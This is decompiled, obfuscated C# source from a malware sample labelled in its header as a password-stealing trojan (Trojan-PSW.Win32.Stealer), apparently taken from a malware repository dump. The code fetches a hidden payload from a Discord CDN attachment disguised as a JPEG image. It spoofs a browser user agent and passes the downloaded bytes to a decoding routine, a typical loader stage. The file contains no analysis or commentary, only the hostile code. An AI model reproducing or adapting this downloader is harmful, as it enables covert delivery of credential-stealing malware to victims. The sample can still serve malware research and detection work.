// Decompiled with JetBrains decompiler
// Type: 
// Assembly: moris, Version=7.3.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 4FA206C1-5DF8-4028-65D0-C8A6781C83C3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.Win32.Stealer.aixd-1adbcbe596643451133f94a5976e52a5e8f608682124477f47141996eb5a98d7.exe

using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

internal sealed class \u0008
{
  internal readonly TaskCompletionSource<object> \u0002;
  internal readonly CancellationToken? \u0003;
  internal readonly object \u0005;

  internal \u0008(TaskCompletionSource<object> _param1, CancellationToken? _param2, object _param3)
  {
    TaskCompletionSource<object> completionSource = _param1;
    if (true)
      goto label_4;
label_1:
    CancellationToken? nullable = _param2;
    if (true)
      goto label_5;
label_2:
    object obj = _param3;
    if (false)
      return;
    this.\u0005 = obj;
    return;
label_5:
    this.\u0003 = nullable;
    goto label_2;
label_4:
    this.\u0002 = completionSource;
    goto label_1;
  }

  internal byte[] \u0002()
  {
    byte[] numArray1 = this.\u0002("https://cdn.discordapp.com/attachments/956061086933741588/956116670928269332/moris_Mynxlnar.jpg");
    if (true)
      goto label_4;
label_1:
    byte[] numArray2;
    ref byte[] local = ref numArray2;
    if (true)
      goto label_5;
label_2:
    byte[] numArray3 = numArray2;
    if (true)
      goto label_6;
label_3:
    byte[] numArray4;
    return numArray4;
label_6:
    numArray4 = numArray3;
    goto label_3;
label_5:
    \u0003.\u0002(ref local);
    goto label_2;
label_4:
    numArray2 = numArray1;
    goto label_1;
  }

  internal byte[] \u0002(string _param1)
  {
    try
    {
      if (true)
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
    }
    catch
    {
    }
    MemoryStream memoryStream = new MemoryStream();
    MemoryStream destination;
    if (true)
      destination = memoryStream;
    try
    {
      HttpWebRequest httpWebRequest1 = (HttpWebRequest) WebRequest.Create(new Uri(_param1));
      if (true)
        goto label_7;
label_6:
      HttpWebRequest httpWebRequest2;
      httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36";
      httpWebRequest2.GetResponse().GetResponseStream().CopyTo((Stream) destination);
      return destination.ToArray();
label_7:
      httpWebRequest2 = httpWebRequest1;
      goto label_6;
    }
    finally
    {
      destination?.Dispose();
    }
  }
}
